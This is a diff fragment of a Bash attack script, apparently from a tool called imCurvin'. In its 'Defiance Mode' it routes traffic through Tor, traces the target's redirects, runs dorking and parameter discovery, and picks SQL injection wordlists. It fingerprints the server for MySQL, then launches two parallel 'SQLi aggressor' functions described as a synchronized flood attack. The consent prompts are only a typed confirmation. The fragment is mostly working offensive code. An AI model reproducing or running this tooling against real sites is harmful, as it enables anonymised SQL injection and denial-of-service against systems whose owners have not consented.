+        if [ "$legal_1" != "YES" ]; then
+          echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
+          exit 1
         fi
-        
-        sleep $((RANDOM % 6 + 4))
-    done < <(shuf "$WORDLIST_MYSQL")
-}
-             
-clear
-print_defiance_logo
-echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multivector parallel network flood."
-echo -e "Executing this mode against unauthorized infrastructures strictly violates cyber laws."
-echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
-read -r legal_1
 
-if [ "$legal_1" != "YES" ]; then
-echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
-exit 1
-fi
+        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly in Defiance Mode."
+        echo -e "This action will trigger heavy CPU calculation loads and dynamic Multi IP routing on the target."
+        echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
+        read -r legal_2
 
-echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly in Defiance Mode."
-echo -e "This action will trigger heavy CPU calculation loads and dynamic Multi IP routing on the target."
-echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m to proceed with the execution sequence: "
-read -r legal_2
-
-if [ "$legal_2" != "I ACCEPT ALL RISKS" ]; then
-echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
-exit 1
-fi
-if ! command -v xxd &> /dev/null; then
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'xxd' is not installed on your terminal."
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install xxd first before running imCurvin'."
-    exit 1
-fi
-if [ -z "$custom_proxy" ]; then
-echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
-
-if pgrep -x "tor" >/dev/null 2>&1; then
-
-echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
-else
-echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
-echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
-
-echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
-exit 1
-fi
-fi
-
-echo -e "[i] Tracing target redirections."
-
-recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-
-if [ -n "$custom_proxy" ]; then 
-recon_proxy="-x $recon_port"; 
-else 
-
-recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; 
-fi
-
-final_destination_url=$(curl $recon_proxy -s -o /dev/null -w "%{url_effective}" -L "$target_url")
-
-export target_url="$final_destination_url"
-
-clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
-dork "$clean_domain"
-dork_status=$?
-
-if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
-
-echo -e "\n[i] Analyzing paramater.."
-eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
-
-param_type=$(echo "$eye_report" | cut -d'|' -f1)
-
-if [ "$param_type" = "QUERY_PARAM" ]; then
-
-discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
-echo -e "\e[0;32m[+]\e[0m Active Query Parameters Spotted > ($discovered_keys)"
-
-elif [ "$param_type" = "PATH_PARAM" ]; then
-
-echo -e "\e[0;32m[+]\e[0m Path/Folder Parameter Spotted."
-else
-echo -e "\e[0;33m[-]\e[0m ayam.py: No parameters detected in the final URL destination."
-fi 
-fi
-if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
-    export WORDLIST_MYSQL="$custom_wordlist"
-else
-    if [[ "$target_url" != *"?"* ]]; then
-        echo -e "\e[0;32m[+]\e[0m Framework Targeting: NonPHP."
-        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHAnonphp.txt"
-    else
-        echo -e "\e[0;32m[+]\e[0m Targeting: Standard PHP / Query Configuration Engaged."
-        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
-    fi
-    if [ "$nerf_mode" = "true" ]; then
-        if [[ "$target_url" != *"?"* ]]; then
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonnerfphp.txt"
-        else
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
+        if [ "$legal_2" != "I ACCEPT ALL RISKS" ]; then
+          echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
+          exit 1
         fi
-    fi
-fi
-echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
+        if ! command -v xxd &> /dev/null; then
+          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'xxd' is not installed on your terminal."
+          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install xxd first before running imCurvin'."
+          exit 1
+        fi
+        if [ -z "$custom_proxy" ]; then
+          echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
 
-server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
+          if pgrep -x "tor" >/dev/null 2>&1; then
 
-if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
+            echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
+          else
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
 
-echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
+            exit 1
+          fi
+        fi
 
-echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Operation aborted to prevent structural asset wastage."
-exit 1
+        echo -e "[i] Tracing target redirections."
 
-else
+        recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
 
-echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
-fi
-sleep 1
+          if [ -n "$custom_proxy" ]; then
+            recon_proxy="-x $recon_port";
+          else
 
-echo -e "\n\e[0;34m[\e[0mi\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+            recon_proxy="--socks5-hostname 127.0.0.1:$recon_port";
+          fi
 
-vector_sqli_agressor_left & 
-pid_vector1=$!
+          final_destination_url=$(curl $recon_proxy -s -o /dev/null -w "%{url_effective}" -L "$target_url")
 
-vector_sqli_agressor_right & 
-pid_vector2=$!
+          export target_url="$final_destination_url"
 
-wait $pid_vector1 $pid_vector2
+          clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
+          dork "$clean_domain"
+          dork_status=$?
 
-echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
-sleep 1
-if [ -s "$ROOT_LOG_FILE" ]; then
-    echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Your log file is not empty."
-    read -p "Do you want to overwrite it? (y/n): " tanya
-    if [ "$tanya" = "y" ]; then
-        > "$ROOT_LOG_FILE"
-        echo -e "\e[0;32m[\e[0m+\e[0;32m]\e[0m Log overwritten.\n"
-    else
-    echo -e "[i] Previous log entries will also be scanned."
-    fi
-fi
-if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
-python "$DEFIANCE_DIR/../validators/defval.py"
-else
-echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping validate."
-fi
+          if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
 
-echo ""
+            echo -e "\n[i] Analyzing paramater.."
+            eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
+
+            param_type=$(echo "$eye_report" | cut -d'|' -f1)
+
+            if [ "$param_type" = "QUERY_PARAM" ]; then
+
+              discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
+              echo -e "\e[0;32m[+]\e[0m Active Query Parameters Spotted > ($discovered_keys)"
+
+            elif [ "$param_type" = "PATH_PARAM" ]; then
+
+              echo -e "\e[0;32m[+]\e[0m Path/Folder Parameter Spotted."
+            else
+              echo -e "\e[0;33m[-]\e[0m ayam.py: No parameters detected in the final URL destination."
+            fi
+          fi
+          if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
+            export WORDLIST_MYSQL="$custom_wordlist"
+          else
+            if [[ "$target_url" != *"?"* ]]; then
+              echo -e "\e[0;32m[+]\e[0m Framework Targeting: NonPHP."
+              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHAnonphp.txt"
+            else
+              echo -e "\e[0;32m[+]\e[0m Targeting: Standard PHP / Query Configuration Engaged."
+              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
+            fi
+            if [ "$nerf_mode" = "true" ]; then
+              if [[ "$target_url" != *"?"* ]]; then
+                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonnerfphp.txt"
+              else
+                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
+              fi
+            fi
+          fi
+          echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
+
+          server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
+
+          if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
+            echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
+
+            echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
+
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Operation aborted to prevent structural asset wastage."
+            exit 1
+
+          else
+
+            echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
+          fi
+          sleep 1
+
+          echo -e "\n\e[0;34m[\e[0mi\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+
+          vector_sqli_agressor_left &
+          pid_vector1=$!
+
+          vector_sqli_agressor_right &
+          pid_vector2=$!
+
+          wait $pid_vector1 $pid_vector2
+
+          echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
+          sleep 1
+          if [ -s "$ROOT_LOG_FILE" ]; then
+            echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Your log file is not empty."
+            read -p "Do you want to overwrite it? (y/n): " tanya
+            if [ "$tanya" = "y" ]; then
+              > "$ROOT_LOG_FILE"
+              echo -e "\e[0;32m[\e[0m+\e[0;32m]\e[0m Log overwritten.\n"
+            else
+              echo -e "[i] Previous log entries will also be scanned."
+            fi
+          fi
+          if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
+            python "$DEFIANCE_DIR/../validators/defval.py"
+          else
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping validate."
+          fi
+
+          echo ""
